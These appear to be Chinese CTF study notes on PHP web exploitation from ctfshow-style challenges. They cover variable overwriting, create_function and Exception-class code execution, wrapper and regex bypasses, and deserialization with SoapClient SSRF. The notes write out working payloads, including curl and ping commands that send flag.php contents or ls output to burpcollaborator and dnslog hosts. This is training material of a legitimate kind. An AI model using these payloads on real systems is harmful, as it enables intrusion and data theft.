:::
```php
<?php 
$x = 75; 
$y = 25;
 
function addition() 
{ 
    $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; 
}
 
addition(); 
echo $z; 
?>
```
#### parse_str + argv
### 
### e->科学计数法
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668737646736-7eca6fcb-fa10-4b3d-8e8d-88d4a4f5ae01.png#averageHue=%23fefefe&clientId=u4787ae80-6c34-4&from=paste&height=249&id=ud8870260&originHeight=497&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37119&status=done&style=none&taskId=u3f72e7d5-c7b7-4df1-a2a2-8d3258bbd1c&title=&width=323)
```php
substr("abcde" ,2 )//返回cde
call_user_func($v1, $s)//回调函数，$v1为函数名称，$s是传到函数中的参数
file_put_contents($v3, $str)//向v3中写入字符串str
```

- 这里显然是需要构造一个字符串v2，让v2在调用某个函数后，可以写到文件中
- 这里还要求v2得是数字，因此中间可以有e，即科学技术法的表示形式
- **php5下is_numeric可识别16进制，如0x2e**

构造`<?=`cat *`;`

- x对字符串先base64加密，再用16进制编码
- 因此对$v1传入hex2bin，即将16进制字符串转为二进制
- file_put_contents函数可以传入伪协议，用base64解码后写入到1.php中

**注意点：这个先base64-encode再hex编码后，最后可能有2d是空格，需要去掉**


### %00截断

- 00截断是操作系统层的漏洞。由于操作系统是C语言或[汇编语言](https://so.csdn.net/so/search?q=%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020)编写的(php也是c语言编写的)，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668775864424-5821c228-1d80-4cdd-acd5-f67d2752463f.png#averageHue=%23fefefd&clientId=u9bb5c3e9-c140-4&from=paste&height=245&id=u86fd5c54&originHeight=490&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41229&status=done&style=none&taskId=u3a695074-82e1-4533-b6e7-cc5240e533f&title=&width=547.5)

- 这里可以通过传入`a%00778`，%00后就可以写数字了

### 类的命令执行
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668777107617-59c8e3e4-be46-4581-b79d-fb71b374de71.png#averageHue=%23fefefe&clientId=u9bb5c3e9-c140-4&from=paste&height=205&id=ub9d80391&originHeight=410&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34159&status=done&style=none&taskId=u86011799-afbc-427f-8360-6ee5a5b10ab&title=&width=588)

- 看题的想法是需要找到一个类，在类的()里可以执行phpinfo()

Exception类：
```php
echo new Exception('aaa') //输出中有aaa
echo new Exception(phpinfo())//会输出phpinfo()
```

- 因此我可以rce
```php
v1=Exception&v2=system('ls')
//相当于先执行system('ls'),返回flag.txt，再调用flag.txt()，无返回结果
v1=Exception&v2=system('echo phpinfo')
//这就相当于'phpinfo'()---->可以执行phpinfo()函数
```
#### 遍历文件类
```php
class FilesystemIterator extends DirectoryIterator
```
FilesystemIterator：遍历文件<br />DirectoryIterator：遍历目录
```php
<?php
//会输出当前目录下的所有文件
$dir = new DirectoryIterator(dirname(__FILE__));
foreach ($dir as $fileinfo) {
    echo $fileinfo;
}
//输出第一个目录
echo new DirectoryIterator(dirname(__FILE__));
//输出第一个文件

echo new FilesystemIterator(dirname(__FILE__));
?>
```
##### 获取当前目录

- 点(.)：代表当前目录
- getcwd()
- __FILE__ 常量包含当前(例如包含)文件的完整路径和文件名

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668823979619-02eab651-b33b-4baf-a8c0-118418e838bf.png#averageHue=%231e1e1e&clientId=u6015fdbf-26e3-4&from=paste&height=574&id=uea5dcc42&originHeight=1147&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49935&status=done&style=none&taskId=uf85737f5-3b4f-456a-8204-2f27689f587&title=&width=507.5)

### 伪协议绕过is_file
[https://www.php.net/manual/zh/function.is-file](https://www.php.net/manual/zh/function.is-file)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668930732049-26a81090-3212-450e-832d-005cd5fdba6f.png#averageHue=%23fefefe&clientId=ue0baabe6-abb7-4&from=paste&height=243&id=u72720144&originHeight=486&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45245&status=done&style=none&taskId=u128cf76b-32fb-4c56-bbae-917de354596&title=&width=656)

- 查看文档发现支持用伪协议取文件绕过is_file
- 这里使用zip协议

[https://www.php.net/manual/zh/wrappers.compression.php](https://www.php.net/manual/zh/wrappers.compression.php)
```php
compress.zlib://file.gz //也可以是file.txt
```
## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668931327022-0f5d3d7b-898c-4524-aef0-9992f31fa79d.png#averageHue=%235d7c62&clientId=ue0baabe6-abb7-4&from=paste&height=184&id=u14b83fcf&originHeight=367&originWidth=1981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56091&status=done&style=none&taskId=u2e70c29f-b09b-4f57-9d64-07c280e1163&title=&width=990.5)
### extract
[https://www.php.net/manual/zh/function.extract](https://www.php.net/manual/zh/function.extract)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668955516930-6227cc62-f015-4a80-994e-53e69f8a649a.png#averageHue=%23fefefd&clientId=u1dab4844-0272-4&from=paste&height=217&id=ub1f7ca77&originHeight=434&originWidth=1886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59756&status=done&style=none&taskId=u5ef3749c-704a-4aee-b5d9-abb50464916&title=&width=943)

- extract从数组中将变量导入到当前的符号表
```php
CTF_SHOW=1&CTF[SHOW.COM=2&fun=extract($_POST)&fl0g=flag_give_me

```

- 这里会变成$fl0g=flag_give_me
#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669260118136-5923b33f-168e-481f-bfb6-3264592a343d.png#averageHue=%23fefefd&clientId=u29acd7f1-1e00-4&from=paste&height=171&id=u51645060&originHeight=376&originWidth=1580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42963&status=done&style=none&taskId=u165ff297-7f46-4b27-9b03-383b0754c7a&title=&width=718.1818026156468)

- 这里要覆盖变量
- 既然是extract($_POST)
```php
_POST[key1]=36d&_POST[key2]=36d
```
### parse_str+argv
#### argv

1、cli模式（命令行）下

	第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033509815-71439794-6816-42ad-bd6e-7500faaf2c34.png#averageHue=%231e1e1e&clientId=u77333d8d-acc7-4&from=paste&height=68&id=u1c66defc&originHeight=135&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24707&status=done&style=none&taskId=ufb2d2e78-85d8-460f-a39f-6c625b93450&title=&width=490)

2、web网页模式下
:::info
在web页模式下必须在php.ini开启**register_argc_argv配置项**<br />	<br />设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER['argv']才会有效果

这时候的`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`

$argv,$argc在web模式下不适用
:::

- 下面打印的是$_SERVER['argv']

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033486617-a633ffed-4984-4ffc-a048-53cbd539cced.png#averageHue=%23fcfcfc&clientId=u77333d8d-acc7-4&from=paste&height=606&id=ub597e7fc&originHeight=1212&originWidth=1530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73057&status=done&style=none&taskId=ue46db48f-bed4-42f0-9a3a-1746021af6b&title=&width=765)
#### parse_str
[https://www.php.net/manual/zh/function.parse-str](https://www.php.net/manual/zh/function.parse-str)
```php
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";

// 推荐用法
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz

// 不建议这么用
parse_str($str);
echo $first;  // value
echo $arr[0]; // foo bar
echo $arr[1]; // baz
?>
```
#### 例子
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669033630074-1b59f295-ff32-4a9d-ab7f-91fe2af77fa4.png#averageHue=%23fefefd&clientId=u77333d8d-acc7-4&from=paste&height=194&id=iVv94&originHeight=387&originWidth=2164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60455&status=done&style=none&taskId=u3a59aa68-a3d7-4436-8bbd-01d72f661be&title=&width=1082)

- 这里利用argv对$fl0g进行变量覆盖
```php
//get提交
a=1+fl0g=flag_give_me//+相当于空格，
//post提交
CTF_SHOW=1&CTF[show.COM=2&fun=parse_str($a[1])
/*
$a[1] = 'fl0g=flag_give_me'
parse_str($a[1])--->变成 $fl0g = 'fl0g_give_me';
*/

```

### gettext绕过对字母+数字过滤
[https://www.php.net/manual/zh/function.gettext.php](https://www.php.net/manual/zh/function.gettext.php)
:::info
You may use the underscore character '_' as an alias to this function.
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669036567072-367a7889-fac7-4f9a-844f-e5a2f2a23ae8.png#averageHue=%23fefefe&clientId=u77333d8d-acc7-4&from=paste&height=313&id=u56f47c69&originHeight=688&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46615&status=done&style=none&taskId=u036e35a7-2a95-4a86-8eab-8b02c548020&title=&width=527.2727158443989)
```php
f1=_&f2=get_defined_vars
```
### 目录穿越
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669037937230-ff75d285-402b-4ae6-a70d-50f9b03ffa9f.png#averageHue=%23fefefd&clientId=u77333d8d-acc7-4&from=paste&height=133&id=uad4e09de&originHeight=292&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22508&status=done&style=none&taskId=u296c3772-f9ec-4860-9693-9391a3c9c10&title=&width=270.4545395926012)
```php
f=../ctfshow/../../flag.php//虽然ctfshow目录不存在，但是可以访问
```

- 记得查看源代码
### 溢出绕过正则表达式
:::info
正则表达式对长度有限制，当超过一定长度时，就不再检测
:::
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669089056342-03b72ec1-2375-42c1-85af-a4ae26380538.png#averageHue=%23fefefd&clientId=u1cecbf18-abab-4&from=paste&height=227&id=u6babfe5d&originHeight=500&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43526&status=done&style=none&taskId=uf2788f21-334a-483e-bc7b-33ad410e92e&title=&width=327.2727201792821)
```php
<?php
echo str_repeat('very', 250000).'36Dctfshow';
?>
```
### 无回显命令执行
#### curl 带出
##### curl
[https://www.jianshu.com/p/6049f23ee204](https://www.jianshu.com/p/6049f23ee204)

- 在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具
##### Burp Collaborator
[https://blog.csdn.net/fageweiketang/article/details/89073662](https://blog.csdn.net/fageweiketang/article/details/89073662)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669212557549-4846a352-5f4d-42bb-9369-9dadf2454fe5.png#averageHue=%23fefdfc&clientId=ud4c65044-a7b8-4&from=paste&height=435&id=u420305ca&originHeight=957&originWidth=1744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211720&status=done&style=none&taskId=udebe1b43-0eba-4510-85ca-add92343edc&title=&width=792.7272555453721)

- 首先 burp 发送 payload 给目标程序，以上图为例，param 存在漏洞注入点，其 payload 为外部的服务器 url 地址，随后目标程序若进行解析或则引用调用等，则会去访问这个地址，而这个地址是我们的 collaborator 服务器，所以 collaborator 会记录**其访问的请求信息以及响应信息和 dns 的信息**。
- 而当 burp 发送 payload 后，就会不断的去问 collaborator 服务器，你收到我发送的 payload 交互了么，这时 collaborator 就会将交互信息告诉 burp，burp 最后进行报告。
##### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669212453633-e1c71f33-feb7-4dd1-9fae-28b27c17d74c.png#averageHue=%23fefdfd&clientId=ud4c65044-a7b8-4&from=paste&height=148&id=u4ee6380a&originHeight=326&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36175&status=done&style=none&taskId=u81c0143c-51b1-477e-b91c-bbdc9c67ede&title=&width=454.54544469344734)

- 这个里面只能用反引号执行命令，反引号相当于shell_exec，对于执行结果没有回显，因此需要curl带外攻击，即需要一个新的服务器参与

payload：
```php
?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
//前面是变量覆盖，-X指定请求的方式
```

- 前面是变量覆盖
- -X指定请求的方式 -F/--form <name=content> 模拟http表单提交数据 
- 后面的二级域名是在Burp中复制的
- @用于读取文件内容
- 如果没有@，就是这样的

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669213260020-f4b98bb0-12ae-4df8-b302-5e3519cf2bf8.png#averageHue=%23f7f7f7&clientId=ued28d905-c370-4&from=paste&height=222&id=u43282726&originHeight=488&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20007&status=done&style=none&taskId=u53434653-d698-432e-ac77-596392398bc&title=&width=478.18180781750664)
##### 总结

- 相当于用@去读取了文件的内容，在 Burp Collaborator中可以看到request的包，因此就显示出了flag。
#### 利用dnslog带出
:::info
**对于带外命令，有时用ping不好使，可以用wget或curl**<br />shell_exec('curl `ls /`.x3c7at.dnslog.cn')<br />shell_exec('wget `ls /`.x3c7at.dnslog.cn')
:::
##### awk
[https://www.cnblogs.com/wangqiguo/p/5863266.html#_label0](https://www.cnblogs.com/wangqiguo/p/5863266.html#_label0)

- 它是文本处理命令
```shell
echo -e '11 22 33 44\naa bb cc dd' | awk '{print $3" "$2" "$1}'
输出：
33 22 11
cc bb aa
```

- 这里 | 的作用是 将前一个的输出作为下一个命令的输入
##### tr
[https://cloud.tencent.com/developer/article/1725968](https://cloud.tencent.com/developer/article/1725968)
```shell
echo "HELLO ITCAST" | tr 'A-Z' 'a-z' 
输出：
hello itcast 
```

- 把前面的字符串中的大写字母转成小写字母
```shell
echo aabbcc..#dd2 */dk4 | tr -d -c '0-9 \n'  
2 4
```

- -c 表示补集，-d表示删除。补集中包含了数字0~9、空格和换行符\n，所以没有被删除，其他字符全部被删除了。
##### 例题
### <br />
## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669263404214-371bac91-288e-478c-ba53-59d34108eda5.png#averageHue=%23fefdfd&clientId=u29acd7f1-1e00-4&from=paste&height=165&id=h3ZIg&originHeight=364&originWidth=2098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49306&status=done&style=none&taskId=ud54831cb-50c6-4a4e-9e41-e5cf0b3293d&title=&width=953.6363429668526)
利用ping的原理就是DNS请求：
:::info
如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）
:::

[dnslog](http://www.dnslog.cn/)
```shell
F=`$F`; ping `nl flag.php | awk 'NR==15' | tr -d -c '[:lower:]'/'[:digit:]'/'-'`.oi9r87.dnslog.cn -c 1
```

- 注意最开始的空格，是为了在substr之后不报错，经过测试发现对于phpinfo()这样的函数，不受其它字符的干扰，但是`ls`;不行，只能严格按照这个格式执行
- 带出数据只能一排一排的带出
- 将nl的内容给awk，由于只能一排一排带，所以指定行号为15
- 将ask输出给tr，删除flag中除了小写字母、数字、- 的内容
- 用 . 命令拼接dnslog的域名
- -c 设置 ping 的次数，默认无限次，可选
### tee命令
[https://www.runoob.com/linux/linux-comm-tee.html](https://www.runoob.com/linux/linux-comm-tee.html)

:::info
tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669274109649-2b88f7ff-faab-4037-81be-aab161c98455.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=226&id=u75334d84&originHeight=498&originWidth=2232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53477&status=done&style=none&taskId=uebb2a828-6820-43b3-9805-a21c964a05c&title=&width=1014.5454325557745)

- 由于是无回显命令exec，因此可以用tee命令
```shell
ls / | tee 1 //读取输入到1文件中
cat /flag | tee 2 
```
### sed命令
[https://www.runoob.com/linux/linux-comm-sed.html](https://www.runoob.com/linux/linux-comm-sed.html)<br />sed 可依照脚本的指令来处理、编辑文本文件。<br />Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等
```shell
sed -i 's/book/books/g' file
```

- 直接编辑文件选项-i，
- s是取代命令
- book要取代的字符串
- 用books替代
- /g全局搜索，替代所有
- file是操作的文件

#### xargs
:::info
指所以能用到xargs这个命令，关键是由于很多命令不支持 | 管道来传递参数，而日常工作中有有这个必要，所以就有了xargs命令，例如：<br />#这个命令是错误的<br />find /sbin -perm +700 |ls -l<br />#这样才是正确的<br />find /sbin -perm +700 |xargs ls -l
:::

- 一般情况下，处理文本的命令，例如sort、uniq、grep、awk、sed等命令均支持管道；像rm、ls这类的不是处理文本的命令均不支持管道

#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669276524674-f8e2f463-5288-46bd-b5a5-f97ded4625f4.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=225&id=u30ad7075&originHeight=494&originWidth=2220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53419&status=done&style=none&taskId=u00a3d21a-9e87-4bb8-a82d-0d1c84881e2&title=&width=1009.0908872194532)
```shell
c=ls | xargs sed 's/die/echo/'
c=ls | xargs sed 's/exec/system/'
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669276261682-e59c0a14-9dfd-453f-b4e0-0e0e1a0ce4fb.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=225&id=u07f0a390&originHeight=494&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54319&status=done&style=none&taskId=u87e0dda9-f4bf-4283-8ead-4548a9d37d2&title=&width=1041.8181592373815)

- 这样修改完，就可以执行了
### 命令盲注
#### shell中的if
`if [];then fi`
```shell
#!/bin/bash
a=$1
b=$2
if [ $a == $b ];then
   echo "a and b is equal"
fi
if [ $a != $b ];then
   echo "a and b is not equal"
fi
```
#### cut
[https://www.runoob.com/linux/linux-comm-cut.html](https://www.runoob.com/linux/linux-comm-cut.html)

- 从每一行剪切
```shell
who | cut -c 1 //获取第一个字符
```
#### 命令盲注脚本
### create_function
#### create_function函数
[https://www.php.net/manual/zh/function.create-function](https://www.php.net/manual/zh/function.create-function)
:::info
**create_function**(string $args, string $code): string

- 下面两段代码的执行效果是一样的
- **会在$code处执行eval**
:::
```php
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo $newfunc(2, M_E) . "\n";
?>
```
```php
<?php
$newfunc = function($a,$b) { return "ln($a) + ln($b) = " . log($a * $b); };
echo $newfunc(2, M_E) . "\n";
?>
```
#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669518061296-8814df57-09d3-4c7c-a2c6-4da8543bd182.png#averageHue=%23fefefe&clientId=u20045c8e-efb5-4&from=paste&height=134&id=uaa980240&originHeight=295&originWidth=1078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29172&status=done&style=none&taskId=uf1fe4413-160e-4bd5-9f22-9af84fba55a&title=&width=489.99998937953626)
:::info
$ctfshow('', $_GET['show']);<br />这种形式，想到用create_cunction
:::
payload是<br />`ctf=\create_function`，用命名空间绕过正则<br />`?show=}phpinfo();/*`

- **本质上还是可以把$code用eval执行**

这里的闭合的原因是：闭合大括号，注释后面的大括号，就可以命令执行了。
```php
<?php
\create_function('',$_GET['show']);//相当于
function /*匿名函数*/(){
	$_GET['show']
  //}phpinfo();/*
}
?>
```
# 7. 序列化与反序列化

[深度剖析PHP序列化和反序列化 - 悠悠i - 博客园 (cnblogs.com)](https://www.cnblogs.com/youyoui/p/8610068.html)

- 当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()
## 初步-浏览器提交cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669601510388-83720191-f04e-43c7-8387-083edf36c1db.png#averageHue=%23fefefd&clientId=u38b4829f-0909-4&from=paste&height=468&id=ubf1f5f55&originHeight=1030&originWidth=938&originalType=binary&ratio=1&rotation=0&showTitle=false&size=107774&status=done&style=none&taskId=ue8c91b64-b114-495b-8126-d5d400914b2&title=&width=426.36362712245364)

- 浏览器提交cookie的方法是

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669601555076-99948165-e594-40cc-9ce9-01c84d9bc760.png#averageHue=%23eaeff7&clientId=u38b4829f-0909-4&from=paste&height=280&id=ud23a1649&originHeight=615&originWidth=2630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98270&status=done&style=none&taskId=u16b8f30f-25fe-4e10-96a1-51f98989d4a&title=&width=1195.4545195437665)

- 在本地测试：
```php
echo urlencode(serialize((new ctfShowUser))
```
### public 与 private不同
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669605958466-661ea980-bfee-4087-bcc8-2c0621ab9cae.png#averageHue=%23fefefd&clientId=u0bfb7f9b-f4e8-4&from=paste&height=243&id=uf370695d&originHeight=534&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51710&status=done&style=none&taskId=u2dea85c5-d557-44fc-874e-b5d5249396c&title=&width=414.09090011573056)

- 当属性是Public时，序列化的结果对应下面的第一行
- 当属性是Private时，序列化的结果对应下面的第一行
```php
O:11:"ctfShowUser":4:{s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:0;s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:13:"system('ls');";}}
O:11:"ctfShowUser":4:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:0;s:5:"class";O:8:"backDoor":1:{s:4:"code";s:13:"system('ls');";}}
```
## 从0开始Laravel
## 常用payload
### ssrf+反序列化
#### ssrf

1. 服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)
2. 攻击者能够利用目标帮助攻击者访问其他想要攻击的目标
3. 攻击者要求服务器为他访问URL
4. 可用于内网访问
#### netstate
[https://zhuanlan.zhihu.com/p/397058259](https://zhuanlan.zhihu.com/p/397058259)
```shell
.\nc64.exe -lvp 9999

监听9999端口
-l： 开启监听
-p：指定端口
-t： 以telnet形式应答
-e：程序重定向
-n：以数字形式表示ip
-v：显示执行命令过程
-z : 不进行交互，直接显示结果
-u ：使用UDP协议传输
-w : 设置超时时间
```
#### 本地测试
:::info

- **SoapClient::__construct**(?string $wsdl, array $options = []) ,SoapClient类，
- 第二个参数中 uri指nameSpacelocation 
- location：The URL of the SOAP server to send the request to.
:::
```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999",);
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>
```

- **调用不存在的方法，会自动调用__call()函数来发送请求**，因此才可以监听到
- 监听到的信息如下:

![cd0b8b184445e0e036680bec91acf90.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625077997-9b1c1c9a-6749-4017-a649-0c90acdc6010.png#averageHue=%23032658&clientId=u451b27a7-18ab-4&from=paste&height=237&id=u2daf9ec0&originHeight=522&originWidth=1932&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67117&status=done&style=none&taskId=ubfe8c028-8bcd-4cc0-970e-fd03064df3f&title=&width=878.1817991477403)

- 这里可以看到User-Agent是可以注入的
```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1/flag.php",'user_agent'=>$ua));
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>
```
:::info
**知识点：**

- windows中使用\r\n表示换行
:::

- 监听到的信息如下：

![fde4feaec606bbc57e1f81c5673c513.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625239200-ca560448-2dc1-483b-a9b4-cecae61971ae.png#averageHue=%23032759&clientId=u451b27a7-18ab-4&from=paste&height=361&id=u53597c33&originHeight=795&originWidth=1918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106866&status=done&style=none&taskId=ucf25dd6e-c5ed-401f-bd99-5f30fa4ed7e&title=&width=871.818162922032)

- 因为Content-length是13，所以到标记2处就已经结束了，后面的包服务器会忽略

#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625318144-fd0a3466-1cba-4280-947a-5b35b533e776.png#averageHue=%23fefefe&clientId=u451b27a7-18ab-4&from=paste&height=296&id=u26a297d0&originHeight=651&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68046&status=done&style=none&taskId=u1bd73478-6fd2-4b59-9b60-5d1ac637b5f&title=&width=581.8181692076126)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625309055-40110109-38fe-4ce2-8bf6-728b0d60a0c0.png#averageHue=%23fbfbfb&clientId=u451b27a7-18ab-4&from=paste&height=268&id=u4121dc81&originHeight=590&originWidth=2710&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68013&status=done&style=none&taskId=u09ed2cc1-d9b0-44e8-82a1-e90da1dc4fb&title=&width=1231.8181551192424)

- 由于这里不存在getFlag()方法，且需要访问flag.php，直接访问flag.php的结果如下：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669625369217-676b08cb-04dd-4237-97f1-f097d44602a6.png#averageHue=%23fdfbfa&clientId=u451b27a7-18ab-4&from=paste&height=111&id=u8a1d6dcb&originHeight=245&originWidth=1566&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56726&status=done&style=none&taskId=u1ad7a419-db0e-4f3e-8dfb-b0d8d408594&title=&width=711.8181663899386)

- 这就需要用ssrf内网访问
```php
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1",'user_agent'=>$ua));
// $client->getFlag();  //调用不存在的方法，会自动调用__call()函数来发送请求
echo urlencode(serialize($client));
?>
```

- 在反序列化后，会访问127.0.0.1/flag.php，此时因为vip->getFlag()不存在，所以会用__call()函数来发送请求
- 因此在我构造好的$client中就已经满足了flag.php的要求，会将flag写入flag.txt中
- 直接访问flag.txt就可以获得flag

### 字符逃逸
:::info
下面代码会把四个字符的fuck替换成5个字符的loveU，这就有问题<br />对于反序列化：只要后面正常闭合，**即使分号后有其他代码，也可以用var_dump打印出反序列化的结果**。<br />`O:7:"message":1:{s:4:"from";}aaaaa`
:::
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669795927714-6c3f96dd-92cd-4347-99cf-ed0d9bb33a18.png#averageHue=%23fefefd&clientId=u4bac8a14-c256-4&from=paste&height=317&id=u4809f99b&originHeight=698&originWidth=932&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67602&status=done&style=none&taskId=u64dea4ee-fdf4-4106-a892-0298e456f11&title=&width=423.6363544542929)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669795864874-470d8ef2-4c03-4627-8103-b73438c82d68.png#averageHue=%23fefefd&clientId=u4bac8a14-c256-4&from=paste&height=250&id=u49a8389b&originHeight=549&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51925&status=done&style=none&taskId=ubf12b3e8-3921-4a2a-8dae-ec1932b1a16&title=&width=370.909082869853)
#### 分析

- 首先`$msg = new message("fuck","b","c");`，得到下面结果

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669796190523-79ed9561-5047-4624-b409-988a6154694e.png#averageHue=%231e1e1e&clientId=u4bac8a14-c256-4&from=paste&height=34&id=u7ac562d8&originHeight=75&originWidth=1846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16237&status=done&style=none&taskId=u2735b432-3d1f-4d25-b1bf-e84b58b840f&title=&width=839.0908909041038)

- 因为要构造把user改为admin，先改一下

O:7:"message":4:{s:4:"from";s:4:"fuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}

- 构造期望的payload，`$msg = new message('fuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}',"b","c");`
- 输出替换后序列化的结构，可以看到，此时s=66

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669796490985-fe11716b-f85d-4841-8198-718e0ee7017c.png#averageHue=%232a2d2e&clientId=u4bac8a14-c256-4&from=paste&height=53&id=uec8ec3a5&originHeight=117&originWidth=2266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29485&status=done&style=none&taskId=u30343cfa-98bd-49a6-a0bf-821de183372&title=&width=1029.9999776753516)

